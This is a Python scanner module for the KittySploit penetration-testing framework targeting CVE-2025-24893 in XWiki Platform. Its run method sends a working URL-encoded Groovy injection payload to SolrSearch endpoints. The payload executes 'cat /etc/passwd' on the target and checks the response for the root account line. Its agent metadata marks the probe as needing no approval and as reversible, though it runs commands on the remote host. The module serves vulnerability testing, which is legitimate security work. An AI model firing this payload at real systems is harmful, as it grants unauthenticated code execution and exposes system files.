#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Any guest can perform arbitrary remote code execution through a request to SolrSearch."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki Platform - Remote Code Execution Detection',
        'description': 'Any guest can perform arbitrary remote code execution through a request to SolrSearch. This impacts the confidentiality, integrity, and availability of the whole XWiki installation. This vulnerability has been patched in XWiki 15.10.11, 16.4.1, and 16.5.0RC1.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xwiki', 'rce', 'vkev', 'vuln', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-rr6p-3pfg-562j',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-24893',
        ],
        'cve': 'CVE-2025-24893',
    }

    def run(self):
        for path in ('/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20', '/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            ctype_any = ('application/rss+xml',)
            body_regexes = ('root:.*:0:0', 'wiki',)
            if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
                self.set_info(
                    severity='critical',
                    reason='XWiki Platform - Remote Code Execution detected',
                    path=path,
                )
                return True
        return False

